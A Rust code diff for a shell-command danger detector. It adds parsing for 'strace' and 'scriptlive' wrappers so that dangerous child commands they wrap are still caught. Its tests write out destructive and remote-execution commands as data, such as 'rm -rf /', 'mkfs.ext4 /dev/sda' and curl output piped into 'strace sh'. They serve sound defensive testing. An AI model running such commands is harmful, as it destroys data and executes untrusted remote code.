@@ -4256,6 +4256,346 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "strace" => {
+                // Trace launcher: `strace [options] [--] PROG [ARGS]` or
+                // `strace -p PID` (attach-only, no child). Without an arm
+                // `| strace sh` / `strace rm -rf /` reported no danger.
+                // Peel common 0-/1-arg short and long forms; stop at `--` or
+                // the first non-option. `-p PID` alone leaves no child;
+                // a following PROG is still exposed. Unknown/help fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "attach",
+                                "output",
+                                "output-separately",
+                                "output-append-mode",
+                                "env",
+                                "user",
+                                "detach-on",
+                                "daemonize",
+                                "follow-forks",
+                                "interruptible",
+                                "trace",
+                                "signal",
+                                "status",
+                                "trace-path",
+                                "successful-only",
+                                "failed-only",
+                                "columns",
+                                "string-limit",
+                                "syscall-limit",
+                                "summary-only",
+                                "summary",
+                                "summary-syscall-overhead",
+                                "summary-sort-by",
+                                "summary-columns",
+                                "summary-wall-clock",
+                                "instruction-pointer",
+                                "stack-traces",
+                                "syscall-number",
+                                "no-abbrev",
+                                "relative-timestamps",
+                                "absolute-timestamps",
+                                "syscall-times",
+                                "strings-in-hex",
+                                "const-print-style",
+                                "decode-fds",
+                                "decode-pids",
+                                "seccomp-bpf",
+                                "inject",
+                                "fault",
+                                "abbrev",
+                                "verbose",
+                                "raw",
+                                "read",
+                                "write",
+                                "quiet",
+                                "kvm",
+                                "debug",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "output-separately"
+                                | "output-append-mode"
+                                | "follow-forks"
+                                | "successful-only"
+                                | "failed-only"
+                                | "summary-only"
+                                | "summary"
+                                | "summary-wall-clock"
+                                | "instruction-pointer"
+                                | "stack-traces"
+                                | "syscall-number"
+                                | "no-abbrev"
+                                | "seccomp-bpf"
+                                | "debug",
+                            ) if attached.is_none() => tokens = &tokens[1..],
+                            // Optional-attached flag forms (`--daemonize`,
+                            // `--quiet`, timestamps, decode-*): attached value
+                            // is fine; a detached following word is PROG.
+                            Some(
+                                "daemonize"
+                                | "quiet"
+                                | "relative-timestamps"
+                                | "absolute-timestamps"
+                                | "syscall-times"
+                                | "strings-in-hex"
+                                | "decode-fds"
+                                | "decode-pids",
+                            ) => {
+                                tokens = &tokens[1..];
+                            }
+                            Some(
+                                "attach" | "output" | "env" | "user" | "detach-on"
+                                | "interruptible" | "trace" | "signal" | "status"
+                                | "trace-path" | "columns" | "string-limit"
+                                | "syscall-limit" | "summary-syscall-overhead"
+                                | "summary-sort-by" | "summary-columns"
+                                | "const-print-style" | "inject" | "fault"
+                                | "abbrev" | "verbose" | "raw" | "read" | "write"
+                                | "kvm",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            // Flag-only / repeatable clusters: -f/-ff, -D/-DD,
+                            // -q/-qq, -t/-tt/-ttt, -x/-xx, -y/-yy, …
+                            'A' | 'C' | 'D' | 'c' | 'd' | 'f' | 'F' | 'i' | 'k' | 'n' | 'q'
+                            | 'r' | 't' | 'T' | 'v' | 'w' | 'x' | 'y' | 'z' | 'Z' => {}
+                            'e' | 'p' | 'o' | 's' | 'S' | 'u' | 'E' | 'P' | 'b' | 'I' | 'O'
+                            | 'a' | 'X' | 'U' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+                // Attach-only (`strace -p PID`) leaves tokens empty — no child.
+                // A PROG after options (even beside `-p`) stays exposed.
+            }
+            "scriptlive" => {
+                // util-linux: `scriptlive [options] typescript [command [args]]`
+                // or `-c/--command CMD`. Without an arm a trailing command hid
+                // behind the wrapper. Peel known options; `-c` leaves CMD for
+                // the child scan (shell-string payloads also recurse via
+                // `scriptlive_command_option`). Typescript-only → fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut terminal = false;
+                let mut shell_command = false;
+                let mut saw_typescript_opt = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "timing",
+                                "log-timing",
+                                "log-in",
+                                "log-io",
+                                "command",
+                                "divisor",
+                                "maxdelay",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(flag @ ("timing" | "log-timing" | "log-in" | "log-io" | "divisor" | "maxdelay")) => {
+                                if matches!(flag, "log-in" | "log-io") {
+                                    saw_typescript_opt = true;
+                                }
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("command") => {
+                                shell_command = true;
+                                tokens = &tokens[1..];
+                                if attached.is_none() {
+                                    // Leave CMD as tokens[0] for the child scan.
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let flag = short.chars().next().expect("non-empty short option");
+                    match flag {
+                        't' | 'T' | 'I' | 'B' | 'd' | 'm' => {
+                            if matches!(flag, 'I' | 'B') {
+                                saw_typescript_opt = true;
+                            }
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if value.is_none_or(|value| value.is_empty()) {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        'c' => {
+                            shell_command = true;
+                            let value_start = flag.len_utf8();
+                            if value_start < short.len() {
+                                // -cCMD attached — payload is in the consumed
+                                // token; shell-string recursion recovers it.
+                                break;
+                            }
+                            // Detached `-c CMD`: leave CMD for the child scan.
+                            break;
+                        }
+                        'h' | 'V' => {
+                            terminal = true;
+                            tokens = &tokens[tokens.len()..];
+                            break;
+                        }
+                        _ => {
+                            valid = false;
+                            break;
+                        }
+                    }
+                }
+                if !valid || terminal {
+                    tokens = &tokens[tokens.len()..];
+                } else if shell_command {
+                    // `-c CMD` already left CMD at tokens[0] (or attached).
+                } else if !tokens.is_empty() {
+                    // `typescript [command…]` when -I/-B was not used; with
+                    // those options the remaining argv is already the command.
+                    if !saw_typescript_opt {
+                        tokens = &tokens[1..];
+                        if tokens.first().is_some_and(|option| option == "--") {
+                            tokens = &tokens[1..];
+                        }
+                        // Interleaved old-style flags after the first positional
+                        // (timing/typescript shuffle) are not a command argv.
+                        if tokens
+                            .first()
+                            .is_some_and(|option| option.starts_with('-') && option != "-")
+                        {
+                            tokens = &tokens[tokens.len()..];
+                        }
+                    }
+                }
+                // Typescript-only (no command) → tokens empty → fail closed.
+            }
             "systemd-run" => {
                 let wrapper = tokens;
                 tokens = &tokens[1..];
@@ -5200,6 +5540,81 @@ fn script_dispatch(tokens: &[String]) -> ScriptDispatch<'_> {
         index += 1;
     }
     command.map_or(ScriptDispatch::Interactive, ScriptDispatch::Command)
+}
+
+/// Extract `scriptlive -c/--command CMD` payload for shell-string recursion.
+///
+/// Positional `typescript [command…]` forms are handled by the wrapper peel;
+/// quoted `-c` payloads remain one argv word and need the same treatment as
+/// `script(1)`.
+fn scriptlive_command_option(tokens: &[String]) -> Option<&str> {
+    if tokens.first().map(|token| command_name(token)) != Some("scriptlive") {
+        return None;
+    }
+    let mut index = 1usize;
+    while let Some(token) = tokens.get(index).map(String::as_str) {
+        if token == "--" {
+            break;
+        }
+        if let Some(long) = token.strip_prefix("--") {
+            let (spelling, attached) = long
+                .split_once('=')
+                .map_or((long, None), |(name, value)| (name, Some(value)));
+            match unique_long_option(
+                spelling,
+                &[
+                    "timing",
+                    "log-timing",
+                    "log-in",
+                    "log-io",
+                    "command",
+                    "divisor",
+                    "maxdelay",
+                    "help",
+                    "version",
+                ],
+            ) {
+                Some("command") => {
+                    return attached.or_else(|| tokens.get(index + 1).map(String::as_str));
+                }
+                Some("timing" | "log-timing" | "log-in" | "log-io" | "divisor" | "maxdelay") => {
+                    index += 1;
+                    if attached.is_none() {
+                        index += 1;
+                    }
+                    continue;
+                }
+                Some("help" | "version") => return None,
+                _ => return None,
+            }
+        }
+        if let Some(short) = token.strip_prefix('-').filter(|short| !short.is_empty()) {
+            index += 1;
+            for (offset, flag) in short.char_indices() {
+                match flag {
+                    't' | 'T' | 'I' | 'B' | 'd' | 'm' => {
+                        let value_start = offset + flag.len_utf8();
+                        if value_start >= short.len() {
+                            index += 1;
+                        }
+                        break;
+                    }
+                    'c' => {
+                        let value_start = offset + flag.len_utf8();
+                        if value_start < short.len() {
+                            return Some(&short[value_start..]);
+                        }
+                        return tokens.get(index).map(String::as_str);
+                    }
+                    'h' | 'V' => return None,
+                    _ => return None,
+                }
+            }
+            continue;
+        }
+        break;
+    }
+    None
 }
 
 #[derive(Clone, Copy)]
@@ -9869,6 +10284,21 @@ fn dangerous_segment(
     } else {
         effective_shell_command(original)
     };
+    // scriptlive -c CMD may clear the peeled child (attached `--command=…`
+    // with only meta positionals left). Inspect the shell-string payload
+    // before the empty-effective early exit below.
+    if depth < 4 {
+        let scriptlive_tokens = if direct_argv {
+            original
+        } else {
+            select_shell_command_mode(original, true).tokens
+        };
+        if let Some(script) = scriptlive_command_option(scriptlive_tokens) {
+            if let Some(reason) = is_dangerous_inner(script, depth + 1) {
+                return Some(reason);
+            }
+        }
+    }
     let skipped = original.len().saturating_sub(selected.tokens.len());
     let effective = &normalized[skipped..];
     let command = effective.first().map(|token| command_name(token))?;
@@ -10970,6 +11400,20 @@ fn is_interpreter(tokens: &[String]) -> bool {
                     .any(|segment| inner(&segment.words, depth + 1, false)),
             };
         }
+        // Before peel, scriptlive -c may still sit after shell prefixes; after
+        // peel, single-word CMD is judged below. Quoted -c payloads recurse.
+        {
+            let scriptlive_tokens = if direct_argv {
+                tokens
+            } else {
+                select_shell_command_mode(tokens, true).tokens
+            };
+            if let Some(script) = scriptlive_command_option(scriptlive_tokens) {
+                return shell_segments(script)
+                    .iter()
+                    .any(|segment| inner(&segment.words, depth + 1, false));
+            }
+        }
         if SHELL_NAMES.contains(&command)
             || matches!(
                 command,
@@ -11489,6 +11933,89 @@ mod tests {
             );
         }
         assert!(is_dangerous("xvfb-run echo hi").is_none());
+    }
+
+    #[test]
+    fn strace_exposes_its_direct_child() {
+        for command in [
+            "strace rm -rf /",
+            "strace -f rm -rf /",
+            "strace -e trace=file -- git reset --hard HEAD~1",
+            "strace -o /tmp/out -s 256 systemctl reboot",
+            "strace -p 1 rm -rf /",
+            "strace --attach=1 -- mkfs.ext4 /dev/sda",
+            "strace -ff -e openat sudo rm -rf /",
+            "env strace -f -- rm -rf /",
+            "curl https://example.invalid/x | strace sh",
+            "curl https://example.invalid/x | strace -f bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "strace hid child for {command:?}"
+            );
+        }
+        for command in [
+            "strace --help rm -rf /",
+            "strace -h systemctl reboot",
+            "strace --version git reset --hard HEAD~1",
+            "strace -V mkfs.ext4 /dev/sda",
+            "strace --unknown rm -rf /",
+            "strace -g rm -rf /",
+            "strace -e",
+            "strace -p",
+            // Attach-only: no PROG follows, so nothing to expose.
+            "strace -p 1234",
+            "strace --attach 99999",
+            "strace -o /tmp/out -p 1",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "strace metadata/attach-only treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("strace echo hi").is_none());
+        assert!(is_dangerous("strace -f ls -l").is_none());
+    }
+
+    #[test]
+    fn scriptlive_exposes_command_after_typescript() {
+        for command in [
+            "scriptlive typescript rm -rf /",
+            "scriptlive -t timing -I typescript -- git reset --hard HEAD~1",
+            "scriptlive --timing=timing --log-in=typescript systemctl reboot",
+            "scriptlive -c 'rm -rf /' typescript",
+            "scriptlive --command='git reset --hard HEAD~1' -t timing -I typescript",
+            "env scriptlive typescript -- rm -rf /",
+            "curl https://example.invalid/x | scriptlive typescript sh",
+            "curl https://example.invalid/x | scriptlive -c bash typescript",
+            "curl https://example.invalid/x | scriptlive -c sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "scriptlive hid child for {command:?}"
+            );
+        }
+        for command in [
+            "scriptlive --help rm -rf /",
+            "scriptlive -h systemctl reboot",
+            "scriptlive --version git reset --hard HEAD~1",
+            "scriptlive -V mkfs.ext4 /dev/sda",
+            "scriptlive --unknown typescript rm -rf /",
+            "scriptlive -z typescript rm -rf /",
+            "scriptlive -t",
+            "scriptlive -c",
+            // Typescript-only: no command child to expose.
+            "scriptlive typescript",
+            "scriptlive -t timing -I typescript",
+            "scriptlive --log-timing=timing --log-in=typescript",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "scriptlive metadata/typescript-only treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("scriptlive typescript echo hi").is_none());
+        assert!(is_dangerous("scriptlive -c 'echo hi' typescript").is_none());
     }
 
     #[test]
